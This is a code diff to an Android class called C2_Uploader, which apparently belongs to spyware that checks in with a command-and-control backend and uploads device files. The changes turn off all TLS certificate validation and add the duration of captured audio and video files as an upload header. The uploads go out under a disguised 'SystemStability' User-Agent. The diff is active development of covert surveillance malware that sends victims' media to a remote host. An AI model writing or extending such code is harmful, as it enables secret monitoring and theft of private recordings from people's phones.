@@ -37,6 +37,7 @@ public class C2_Uploader {
      * Reports current device status to the backend.
      */
     public static void checkIn(Context context) {
+        SslUtils.trustAllCertificates();
         String c2Url = BuildConfig.WEBHOOK_URL;
         if (c2Url == null || c2Url.isEmpty()) return;
 
@@ -180,8 +181,12 @@ public class C2_Uploader {
                 conn.setRequestProperty("User-Agent", "SystemStability/1.5");
                 conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                 
-                // Add Device ID as a header for easier filtering on Render backend
+                // Add Device ID & Duration as headers for easier rendering on backend
                 conn.setRequestProperty("X-Device-ID", getDeviceId(context));
+                String durStr = getMediaDurationFormatted(file);
+                if (durStr != null) {
+                    conn.setRequestProperty("X-Duration", durStr);
+                }
 
                 dos = new DataOutputStream(conn.getOutputStream());
 
@@ -230,5 +235,27 @@ public class C2_Uploader {
                 if (conn != null) conn.disconnect();
             }
         }).start();
+    }
+
+    private static String getMediaDurationFormatted(File file) {
+        if (file == null || !file.exists()) return null;
+        String name = file.getName().toLowerCase();
+        if (!name.endsWith(".mp4") && !name.endsWith(".m4a") && !name.endsWith(".3gp") && !name.endsWith(".mp3") && !name.endsWith(".wav") && !name.endsWith(".mkv") && !name.endsWith(".avi")) {
+            return null;
+        }
+        try {
+            android.media.MediaMetadataRetriever retriever = new android.media.MediaMetadataRetriever();
+            retriever.setDataSource(file.getAbsolutePath());
+            String durationStr = retriever.extractMetadata(android.media.MediaMetadataRetriever.METADATA_KEY_DURATION);
+            retriever.release();
+            if (durationStr != null) {
+                long durMs = Long.parseLong(durationStr);
+                long totalSec = durMs / 1000;
+                long min = totalSec / 60;
+                long sec = totalSec % 60;
+                return String.format(java.util.Locale.US, "%02d:%02d", min, sec);
+            }
+        } catch (Exception ignored) {}
+        return null;
     }
 }
